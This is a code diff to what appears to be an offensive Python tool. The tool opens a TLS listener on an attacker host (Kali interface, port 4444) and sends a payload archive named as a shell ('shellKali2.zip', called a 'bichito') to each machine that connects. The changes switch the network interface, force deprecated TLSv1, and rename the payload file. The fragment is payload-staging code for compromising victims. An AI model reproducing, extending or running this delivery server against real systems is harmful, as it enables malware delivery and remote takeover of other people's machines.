@@ -10,8 +10,8 @@ KEYFILE = 'key'
 CERTFILE = 'cert'
 
 
-LHOST = netifaces.ifaddresses('en0')[netifaces.AF_INET][0]['addr']      # MAC
-# LHOST = netifaces.ifaddresses('eth1')[netifaces.AF_INET][0]['addr']   -> Kali
+# LHOST = netifaces.ifaddresses('en0')[netifaces.AF_INET][0]['addr']  # MAC
+LHOST = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']  #Kali
 LPORT = 4444
 
 
@@ -56,6 +56,8 @@ def send_bichito(address):
     s_ssl = ssl.wrap_socket(s, 
                             keyfile=KEYFILE,
                             certfile=CERTFILE, 
+                            ssl_version=ssl.PROTOCOL_TLSv1, 
+                            ciphers="AES", 
                             server_side=True)
 
     while True:
@@ -64,7 +66,7 @@ def send_bichito(address):
             print('Got connection', a)
             print('Sending bichito...')
             while True:
-                filename='shellkali__.zip'
+                filename='shellKali2.zip'
                 f = open(filename,'rb')
                 l = f.read(8192)
 
